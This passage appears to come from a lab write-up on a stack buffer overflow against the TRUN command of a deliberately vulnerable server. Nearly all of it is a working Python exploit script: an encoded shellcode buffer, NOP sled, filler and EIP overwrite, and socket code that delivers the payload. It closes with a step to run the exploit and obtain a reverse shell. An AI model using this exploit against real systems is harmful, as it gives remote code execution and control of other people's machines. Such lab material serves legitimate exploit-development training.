buf += b"\x30\xbd\xd9\xee\xad\x23\x94\xba\xad\x24\xff\xc9\x9e"
buf += b"\xc5\x0d\xf9\x7c\x49\x19\x02\xd5\x17\xc1\x82\x94\x23"
buf += b"\xb5\x48\x30\x6a\xa5\xcd\xd2\x0b\x13\x26\x9a\xa5\x1d"
buf += b"\x11\x9f\x07\x40\x23\x68\x3f\x06\x05\x20\x0b\x60\x11"
buf += b"\x5f\x28\x88\xbe\x29\xf8\x7d\x8f\x59\xf2\x7d\xf6\xfa"
buf += b"\x47\x64"

NOP = '\x90' * 32

filler = 'C' * (crash - (len(offset) + len(EIP) + len(buf) + len(NOP)))

payload = '/.../' + offset + EIP + NOP + buf + filler

print "Fuzzing TRUN with %s bytes" % len(payload)
try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=s.connect((ip,port))
        s.recv(1024)
        s.send('TRUN ' + payload)
        s.recv(1024)
        s.close()
except:
        print "\nCould not connect!"
```

Execute the exploit and obtain the shell:

![Obtaining a reverse shell](../../zzz_res/attachments/Pasted_image_20210501230620.png)

Obtaining a reverse shell